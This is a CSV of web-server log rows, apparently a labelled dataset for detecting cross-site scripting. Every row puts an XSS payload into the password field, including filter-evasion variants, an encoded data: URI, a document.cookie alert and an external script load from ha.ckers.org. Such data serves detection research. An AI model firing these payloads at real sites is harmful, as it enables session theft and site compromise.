,ip_address,date,hour,minute,seconds,protocol,username,password,status,respsize,timed,label
303,192.108.116.88,18/Dec/2017,15,54,07,GET,datalab,"exp/*<A STYLE='no\xss:noxss(*//*"");",200,1040,2,1
304,192.108.116.88,18/Dec/2017,15,54,07,GET,datalab,"exp/*<A STYLE='no\xss:noxss(*//*"");",200,945,1,1
305,192.108.116.88,18/Dec/2017,15,54,07,GET,datalab,"exp/*<A STYLE='no\xss:noxss(*//*"");",200,34463,1,1
306,192.108.116.88,18/Dec/2017,15,56,07,POST,datalab,"exp/*<A STYLE='no\xss:noxss(*//*"");",-,-,-,1
307,192.108.116.88,18/Dec/2017,15,58,08,POST,datalab,"exp/*<A STYLE='no\xss:noxss(*//*"");",-,-,-,1
308,192.108.116.88,18/Dec/2017,15,58,32,GET,datalab,"xss:ex/*XSS*//*/*/pression(alert(XSS""))'>",200,1040,1,1
309,192.108.116.88,18/Dec/2017,15,58,32,GET,datalab,"xss:ex/*XSS*//*/*/pression(alert(XSS""))'>",200,945,1,1
310,192.108.116.88,18/Dec/2017,15,58,33,GET,datalab,"xss:ex/*XSS*//*/*/pression(alert(XSS""))'>",200,34463,1,1
311,192.108.116.88,18/Dec/2017,16,00,33,POST,datalab,"xss:ex/*XSS*//*/*/pression(alert(XSS""))'>",-,-,-,1
312,192.108.116.88,18/Dec/2017,16,02,33,POST,datalab,"xss:ex/*XSS*//*/*/pression(alert(XSS""))'>",-,-,-,1
313,192.108.116.88,18/Dec/2017,16,02,54,GET,datalab,"<STYLE TYPE=text/javascript"">alert('XSS');</STYLE>",200,1040,55,1
314,192.108.116.88,18/Dec/2017,16,02,54,GET,datalab,"<STYLE TYPE=text/javascript"">alert('XSS');</STYLE>",200,945,272,1
315,192.108.116.88,18/Dec/2017,16,02,54,GET,datalab,"<STYLE TYPE=text/javascript"">alert('XSS');</STYLE>",200,34463,50,1
316,192.108.116.88,18/Dec/2017,16,04,54,POST,datalab,"<STYLE TYPE=text/javascript"">alert('XSS');</STYLE>",-,-,-,1
317,192.108.116.88,18/Dec/2017,16,06,55,POST,datalab,"<STYLE TYPE=text/javascript"">alert('XSS');</STYLE>",-,-,-,1
318,192.108.116.88,18/Dec/2017,16,11,42,GET,datalab,"<STYLE type=text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",200,1040,46,1
319,192.108.116.88,18/Dec/2017,16,11,43,GET,datalab,"<STYLE type=text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",200,945,21,1
320,192.108.116.88,18/Dec/2017,16,11,43,GET,datalab,"<STYLE type=text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",200,34463,4,1
321,192.108.116.88,18/Dec/2017,16,13,43,POST,datalab,"<STYLE type=text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",-,-,-,1
322,192.108.116.88,18/Dec/2017,16,15,43,POST,datalab,"<STYLE type=text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",-,-,-,1
323,192.108.116.88,18/Dec/2017,16,16,04,GET,datalab,"<XSS STYLE=xss:expression(alert('XSS'))"">",200,1040,35,1
324,192.108.116.88,18/Dec/2017,16,16,04,GET,datalab,"<XSS STYLE=xss:expression(alert('XSS'))"">",200,945,13,1
325,192.108.116.88,18/Dec/2017,16,16,04,GET,datalab,"<XSS STYLE=xss:expression(alert('XSS'))"">",200,34463,2,1
326,192.108.116.88,18/Dec/2017,16,18,04,POST,datalab,"<XSS STYLE=xss:expression(alert('XSS'))"">",-,-,-,1
327,192.108.116.88,18/Dec/2017,16,20,04,POST,datalab,"<XSS STYLE=xss:expression(alert('XSS'))"">",-,-,-,1
328,192.108.116.88,18/Dec/2017,16,20,48,GET,datalab,?script?alert(?XSS?)?/script?,200,1040,,1
329,192.108.116.88,18/Dec/2017,16,20,49,GET,datalab,?script?alert(?XSS?)?/script?,200,945,,1
330,192.108.116.88,18/Dec/2017,16,20,49,GET,datalab,?script?alert(?XSS?)?/script?,200,34463,,1
331,192.108.116.88,18/Dec/2017,16,20,51,POST,datalab,?script?alert(?XSS?)?/script?,200,1073,,1
332,192.108.116.88,18/Dec/2017,16,20,52,GET,datalab,?script?alert(?XSS?)?/script?,304,-,,1
333,192.108.116.88,18/Dec/2017,16,20,52,GET,datalab,?script?alert(?XSS?)?/script?,304,-,,1
334,192.108.116.88,18/Dec/2017,16,30,11,GET,datalab,"<IFRAME SRC=javascript:alert('XSS');""></IFRAME>",200,1040,51,1
335,192.108.116.88,18/Dec/2017,16,30,11,GET,datalab,"<IFRAME SRC=javascript:alert('XSS');""></IFRAME>",200,945,87,1
336,192.108.116.88,18/Dec/2017,16,30,11,GET,datalab,"<IFRAME SRC=javascript:alert('XSS');""></IFRAME>",200,34463,8,1
337,192.108.116.88,18/Dec/2017,16,32,11,POST,datalab,"<IFRAME SRC=javascript:alert('XSS');""></IFRAME>",-,-,-,1
338,192.108.116.88,18/Dec/2017,16,34,12,POST,datalab,"<IFRAME SRC=javascript:alert('XSS');""></IFRAME>",-,-,-,1
339,192.108.116.88,18/Dec/2017,16,34,35,GET,datalab,"<IFRAME SRC=# onmouseover=alert(document.cookie)""></IFRAME>",200,1040,38,1
340,192.108.116.88,18/Dec/2017,16,34,36,GET,datalab,"<IFRAME SRC=# onmouseover=alert(document.cookie)""></IFRAME>",200,945,13,1
341,192.108.116.88,18/Dec/2017,16,34,36,GET,datalab,"<IFRAME SRC=# onmouseover=alert(document.cookie)""></IFRAME>",200,34463,4,1
342,192.108.116.88,18/Dec/2017,16,34,37,POST,datalab,"<IFRAME SRC=# onmouseover=alert(document.cookie)""></IFRAME>",200,1073,259,1
343,192.108.116.88,18/Dec/2017,16,34,37,GET,datalab,"<IFRAME SRC=# onmouseover=alert(document.cookie)""></IFRAME>",304,-,30,1
344,192.108.116.88,18/Dec/2017,16,34,37,GET,datalab,"<IFRAME SRC=# onmouseover=alert(document.cookie)""></IFRAME>",304,-,18,1
345,192.108.116.88,18/Dec/2017,16,34,52,GET,datalab,"<FRAMESET><FRAME SRC=javascript:alert('XSS');""></FRAMESET>",200,1040,1,1
346,192.108.116.88,18/Dec/2017,16,34,52,GET,datalab,"<FRAMESET><FRAME SRC=javascript:alert('XSS');""></FRAMESET>",200,945,4,1
347,192.108.116.88,18/Dec/2017,16,34,53,GET,datalab,"<FRAMESET><FRAME SRC=javascript:alert('XSS');""></FRAMESET>",200,34463,1,1
348,192.108.116.88,18/Dec/2017,16,36,52,POST,datalab,"<FRAMESET><FRAME SRC=javascript:alert('XSS');""></FRAMESET>",-,-,-,1
349,192.108.116.88,18/Dec/2017,16,38,54,POST,datalab,"<FRAMESET><FRAME SRC=javascript:alert('XSS');""></FRAMESET>",-,-,-,1
350,192.108.116.88,18/Dec/2017,16,39,18,GET,datalab,"<TABLE BACKGROUND=javascript:alert('XSS')"">",200,1040,18,1
351,192.108.116.88,18/Dec/2017,16,39,20,GET,datalab,"<TABLE BACKGROUND=javascript:alert('XSS')"">",200,945,14,1
352,192.108.116.88,18/Dec/2017,16,39,20,GET,datalab,"<TABLE BACKGROUND=javascript:alert('XSS')"">",200,34463,317,1
353,192.108.116.88,18/Dec/2017,16,41,21,POST,datalab,"<TABLE BACKGROUND=javascript:alert('XSS')"">",-,-,-,1
354,192.108.116.88,18/Dec/2017,16,43,22,POST,datalab,"<TABLE BACKGROUND=javascript:alert('XSS')"">",-,-,-,1
355,192.108.116.88,18/Dec/2017,16,43,41,GET,datalab,"<TABLE><TD BACKGROUND=javascript:alert('XSS')"">",200,1040,0,1
356,192.108.116.88,18/Dec/2017,16,43,42,GET,datalab,"<TABLE><TD BACKGROUND=javascript:alert('XSS')"">",200,945,1,1
357,192.108.116.88,18/Dec/2017,16,43,43,GET,datalab,"<TABLE><TD BACKGROUND=javascript:alert('XSS')"">",200,34463,1,1
358,192.108.116.88,18/Dec/2017,16,45,42,POST,datalab,"<TABLE><TD BACKGROUND=javascript:alert('XSS')"">",-,-,-,1
359,192.108.116.88,18/Dec/2017,16,47,44,POST,datalab,"<TABLE><TD BACKGROUND=javascript:alert('XSS')"">",-,-,-,1
360,192.108.116.88,18/Dec/2017,16,52,19,GET,datalab,"<DIV STYLE=background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",200,1040,546,1
361,192.108.116.88,18/Dec/2017,16,52,29,GET,datalab,"<DIV STYLE=background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",200,945,1832,1
362,192.108.116.88,18/Dec/2017,16,52,29,GET,datalab,"<DIV STYLE=background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",200,34463,7689,1
363,192.108.116.88,18/Dec/2017,16,54,22,POST,datalab,"<DIV STYLE=background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",-,-,-,1
364,192.108.116.88,18/Dec/2017,16,56,25,POST,datalab,"<DIV STYLE=background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",-,-,-,1
365,192.108.116.88,18/Dec/2017,17,05,33,GET,datalab,<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->,200,1040,,1
366,192.108.116.88,18/Dec/2017,17,05,34,GET,datalab,<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->,200,945,,1
367,192.108.116.88,18/Dec/2017,17,05,34,GET,datalab,<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->,200,34463,,1
368,192.108.116.88,18/Dec/2017,17,07,34,POST,datalab,<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->,-,-,,1
369,192.108.116.88,18/Dec/2017,17,24,25,GET,datalab,"<IMG SRC=http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"">",200,1040,1,1
370,192.108.116.88,18/Dec/2017,17,24,25,GET,datalab,"<IMG SRC=http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"">",200,945,2,1
371,192.108.116.88,18/Dec/2017,17,24,26,GET,datalab,"<IMG SRC=http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"">",200,34463,1,1
372,192.108.116.88,18/Dec/2017,17,24,30,POST,datalab,"<IMG SRC=http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"">",200,1073,1763,1
373,192.108.116.88,18/Dec/2017,17,24,32,GET,datalab,"<IMG SRC=http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"">",304,-,1,1
374,192.108.116.88,18/Dec/2017,17,24,32,GET,datalab,"<IMG SRC=http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"">",304,-,4,1
375,192.108.116.88,18/Dec/2017,17,35,10,GET,datalab,"<SCRIPT a=`>` SRC=http://ha.ckers.org/xss.js""></SCRIPT>",200,1040,0,1
376,192.108.116.88,18/Dec/2017,17,35,11,GET,datalab,"<SCRIPT a=`>` SRC=http://ha.ckers.org/xss.js""></SCRIPT>",200,945,1,1
377,192.108.116.88,18/Dec/2017,17,35,12,GET,datalab,"<SCRIPT a=`>` SRC=http://ha.ckers.org/xss.js""></SCRIPT>",200,34463,1,1
378,192.108.116.88,18/Dec/2017,17,35,15,POST,datalab,"<SCRIPT a=`>` SRC=http://ha.ckers.org/xss.js""></SCRIPT>",200,1073,1207,1
379,192.108.116.88,18/Dec/2017,17,35,15,GET,datalab,"<SCRIPT a=`>` SRC=http://ha.ckers.org/xss.js""></SCRIPT>",304,-,1,1
380,192.108.116.88,18/Dec/2017,17,35,15,GET,datalab,"<SCRIPT a=`>` SRC=http://ha.ckers.org/xss.js""></SCRIPT>",304,-,9,1
381,192.108.116.88,18/Dec/2017,17,40,16,GET,datalab,"<A HREF=http://66.102.7.147/"">XSS</A>",200,1040,0,1
382,192.108.116.88,18/Dec/2017,17,40,16,GET,datalab,"<A HREF=http://66.102.7.147/"">XSS</A>",200,945,1,1
383,192.108.116.88,18/Dec/2017,17,40,16,GET,datalab,"<A HREF=http://66.102.7.147/"">XSS</A>",200,34463,1,1
384,192.108.116.88,18/Dec/2017,17,40,17,POST,datalab,"<A HREF=http://66.102.7.147/"">XSS</A>",200,1073,480,1
385,192.108.116.88,18/Dec/2017,17,40,18,GET,datalab,"<A HREF=http://66.102.7.147/"">XSS</A>",304,-,1,1
386,192.108.116.88,18/Dec/2017,17,40,18,GET,datalab,"<A HREF=http://66.102.7.147/"">XSS</A>",304,-,8,1
387,192.108.116.88,18/Dec/2017,17,40,52,GET,datalab,veris-->group<svg/onload=alert(/XSS/)//,200,1040,,1
388,192.108.116.88,18/Dec/2017,17,40,52,GET,datalab,veris-->group<svg/onload=alert(/XSS/)//,200,945,,1
389,192.108.116.88,18/Dec/2017,17,40,53,GET,datalab,veris-->group<svg/onload=alert(/XSS/)//,200,34463,,1
390,192.108.116.88,18/Dec/2017,17,40,55,POST,datalab,veris-->group<svg/onload=alert(/XSS/)//,200,1073,,1
391,192.108.116.88,18/Dec/2017,17,40,55,GET,datalab,veris-->group<svg/onload=alert(/XSS/)//,304,-,,1
392,192.108.116.88,18/Dec/2017,17,40,55,GET,datalab,veris-->group<svg/onload=alert(/XSS/)//,304,-,,1
393,192.108.116.88,18/Dec/2017,17,45,40,GET,datalab,element[attribute='<img src=x onerror=alert('XSS');>,200,1040,,1
394,192.108.116.88,18/Dec/2017,17,45,41,GET,datalab,element[attribute='<img src=x onerror=alert('XSS');>,200,945,,1
395,192.108.116.88,18/Dec/2017,17,45,42,GET,datalab,element[attribute='<img src=x onerror=alert('XSS');>,200,34463,,1
396,192.108.116.88,18/Dec/2017,17,47,41,POST,datalab,element[attribute='<img src=x onerror=alert('XSS');>,-,-,,1
397,192.108.116.88,18/Dec/2017,17,49,42,POST,datalab,element[attribute='<img src=x onerror=alert('XSS');>,-,-,,1
398,192.108.116.88,18/Dec/2017,17,54,59,GET,datalab,%22;alert%28%27RVRSH3LL_XSS%29//,200,1040,,1
399,192.108.116.88,18/Dec/2017,17,55,00,GET,datalab,%22;alert%28%27RVRSH3LL_XSS%29//,200,945,,1
400,192.108.116.88,18/Dec/2017,17,55,01,GET,datalab,%22;alert%28%27RVRSH3LL_XSS%29//,200,34463,,1
401,192.108.116.88,18/Dec/2017,17,55,03,POST,datalab,%22;alert%28%27RVRSH3LL_XSS%29//,200,1073,,1
402,192.108.116.88,18/Dec/2017,17,55,04,GET,datalab,%22;alert%28%27RVRSH3LL_XSS%29//,304,-,,1
403,192.108.116.88,18/Dec/2017,17,55,04,GET,datalab,%22;alert%28%27RVRSH3LL_XSS%29//,304,-,,1
404,192.108.116.88,18/Dec/2017,17,55,26,GET,datalab,javascript:alert%281%29;,200,1040,,1
405,192.108.116.88,18/Dec/2017,17,55,27,GET,datalab,javascript:alert%281%29;,200,945,,1
406,192.108.116.88,18/Dec/2017,17,55,27,GET,datalab,javascript:alert%281%29;,200,34463,,1
407,192.108.116.88,18/Dec/2017,17,55,31,POST,datalab,javascript:alert%281%29;,200,1073,,1
408,192.108.116.88,18/Dec/2017,17,55,31,GET,datalab,javascript:alert%281%29;,304,-,,1
409,192.108.116.88,18/Dec/2017,17,55,31,GET,datalab,javascript:alert%281%29;,304,-,,1
410,192.108.116.88,18/Dec/2017,17,55,55,GET,datalab,<w contenteditable id=x onfocus=alert()>,200,1040,,1
411,192.108.116.88,18/Dec/2017,17,55,55,GET,datalab,<w contenteditable id=x onfocus=alert()>,200,945,,1
412,192.108.116.88,18/Dec/2017,17,55,56,GET,datalab,<w contenteditable id=x onfocus=alert()>,200,34463,,1
413,192.108.116.88,18/Dec/2017,17,55,58,POST,datalab,<w contenteditable id=x onfocus=alert()>,200,1073,,1
414,192.108.116.88,18/Dec/2017,17,55,58,GET,datalab,<w contenteditable id=x onfocus=alert()>,304,-,,1
415,192.108.116.88,18/Dec/2017,17,55,58,GET,datalab,<w contenteditable id=x onfocus=alert()>,304,-,,1
416,192.108.116.88,18/Dec/2017,17,56,18,GET,datalab,"alert;pg(XSS"")",200,1040,1,1
417,192.108.116.88,18/Dec/2017,17,56,18,GET,datalab,"alert;pg(XSS"")",200,945,1,1
418,192.108.116.88,18/Dec/2017,17,56,19,GET,datalab,"alert;pg(XSS"")",200,34463,1,1
419,192.108.116.88,18/Dec/2017,17,56,22,POST,datalab,"alert;pg(XSS"")",200,1073,595,1
420,192.108.116.88,18/Dec/2017,17,56,23,GET,datalab,"alert;pg(XSS"")",304,-,0,1
421,192.108.116.88,18/Dec/2017,17,56,23,GET,datalab,"alert;pg(XSS"")",304,-,6,1
422,192.108.116.88,18/Dec/2017,17,56,40,GET,datalab,<svg/onload=%26%23097lert%26lpar;1337)>,200,1040,,1
423,192.108.116.88,18/Dec/2017,17,56,40,GET,datalab,<svg/onload=%26%23097lert%26lpar;1337)>,200,945,,1
424,192.108.116.88,18/Dec/2017,17,56,42,GET,datalab,<svg/onload=%26%23097lert%26lpar;1337)>,200,34463,,1
425,192.108.116.88,18/Dec/2017,17,56,45,POST,datalab,<svg/onload=%26%23097lert%26lpar;1337)>,200,1073,,1
426,192.108.116.88,18/Dec/2017,17,56,45,GET,datalab,<svg/onload=%26%23097lert%26lpar;1337)>,304,-,,1
427,192.108.116.88,18/Dec/2017,17,56,46,GET,datalab,<svg/onload=%26%23097lert%26lpar;1337)>,304,-,,1
428,192.108.116.88,18/Dec/2017,17,57,02,GET,datalab,<script>for((i)in(self))eval(i)(1)</script>,200,1040,,1
429,192.108.116.88,18/Dec/2017,17,57,02,GET,datalab,<script>for((i)in(self))eval(i)(1)</script>,200,945,,1
430,192.108.116.88,18/Dec/2017,17,57,03,GET,datalab,<script>for((i)in(self))eval(i)(1)</script>,200,34463,,1
431,192.108.116.88,18/Dec/2017,17,57,06,POST,datalab,<script>for((i)in(self))eval(i)(1)</script>,200,1073,,1
432,192.108.116.88,18/Dec/2017,17,57,06,GET,datalab,<script>for((i)in(self))eval(i)(1)</script>,304,-,,1
433,192.108.116.88,18/Dec/2017,17,57,06,GET,datalab,<script>for((i)in(self))eval(i)(1)</script>,304,-,,1
434,192.108.116.88,18/Dec/2017,17,57,21,GET,datalab,<scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt>,200,1040,,1
435,192.108.116.88,18/Dec/2017,17,57,21,GET,datalab,<scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt>,200,945,,1
436,192.108.116.88,18/Dec/2017,17,57,22,GET,datalab,<scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt>,200,34463,,1
437,192.108.116.88,18/Dec/2017,17,57,23,POST,datalab,<scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt>,200,1073,,1
438,192.108.116.88,18/Dec/2017,17,57,23,GET,datalab,<scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt>,304,-,,1
439,192.108.116.88,18/Dec/2017,17,57,23,GET,datalab,<scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt>,304,-,,1
440,192.108.116.88,18/Dec/2017,17,57,39,GET,datalab,<sCR<script>iPt>alert(1)</SCr</script>IPt>,200,1040,,1
441,192.108.116.88,18/Dec/2017,17,57,39,GET,datalab,<sCR<script>iPt>alert(1)</SCr</script>IPt>,200,945,,1
442,192.108.116.88,18/Dec/2017,17,57,39,GET,datalab,<sCR<script>iPt>alert(1)</SCr</script>IPt>,200,34463,,1
443,192.108.116.88,18/Dec/2017,17,57,40,POST,datalab,<sCR<script>iPt>alert(1)</SCr</script>IPt>,200,1073,,1
444,192.108.116.88,18/Dec/2017,17,57,40,GET,datalab,<sCR<script>iPt>alert(1)</SCr</script>IPt>,304,-,,1
445,192.108.116.88,18/Dec/2017,17,57,40,GET,datalab,<sCR<script>iPt>alert(1)</SCr</script>IPt>,304,-,,1
446,192.108.116.88,18/Dec/2017,17,57,59,GET,datalab,"<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="">test</a",200,1040,0,1
447,192.108.116.88,18/Dec/2017,17,58,01,GET,datalab,"<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="">test</a",200,945,1,1
448,192.108.116.88,18/Dec/2017,17,58,01,GET,datalab,"<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="">test</a",200,34463,7,1
449,192.108.116.88,18/Dec/2017,17,58,04,POST,datalab,"<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="">test</a",200,1073,648,1
450,192.108.116.88,18/Dec/2017,17,58,05,GET,datalab,"<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="">test</a",304,-,0,1
451,192.108.116.88,18/Dec/2017,17,58,05,GET,datalab,"<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="">test</a",304,-,8,1
